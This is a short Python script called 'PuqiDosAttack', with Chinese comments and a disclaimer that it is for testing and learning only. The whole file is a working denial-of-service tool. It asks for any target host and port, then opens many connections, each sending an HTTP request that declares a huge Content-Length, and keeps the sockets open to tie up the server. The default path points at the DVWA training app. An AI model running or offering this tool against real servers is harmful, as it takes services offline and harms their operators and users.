#PuqiDosAttack
#Anthor:PuqiAR
#Coding:UTF-8
#--------请勿适用于违法用途！！！！
#造成的一切后果与作者无关，仅供测试与学习使用！

import socket
import time
import threading

Ver = "1.0"

Max_Connect = 10 # 最大连接数
Attack_Port = 80 # 攻击端口
Attack_Host = "" # 攻击IP地址
Attack_Mode = 1  #攻击模式
socks = []
# Http Requests
Page = "/DVWA"
Request = ("GET %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
       "Content-Length: 1000000000\r\n"
       "\r\n" % (Page, Attack_Host))

def conn_send():
    global socks
    for i in range(0,Max_Connect):
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((Attack_Host,Attack_Port))
            s.send(bytes(Request,encoding="utf-8"))
            print("[+] Send OK!Connect:",i)
            socks.append(s)
        except Exception as e:
            print("[!] Err ",e)

print("PuqiDosAttack\n")
print("Ver",Ver,"\n")
print("请输入攻击地址(例子:127.0.0.1,www.example.com):")
Attack_Host = input()
print("请输入攻击端口(Http:80,Https:443):")
try:
    Attack_Port = int(input())
except Exception:
    print("Err!\n")
    exit()
print("请输入最大连接数:")
try:
    Max_Connect = int(input())
except Exception:
    print("Err!\n")
    exit()
#Ready to attack.
print("attention,PuqiDosAttack start")
print("ready to detonate.")
print("Host:",Attack_Host,":",Attack_Port)
for i in range(3):
    print("attention,PuqiDosAttack start attack as",i,"s")
    time.sleep(1)
print("Detonate as 0s.")
conn_thread = threading.Thread(target=conn_send,args=())
conn_thread.start()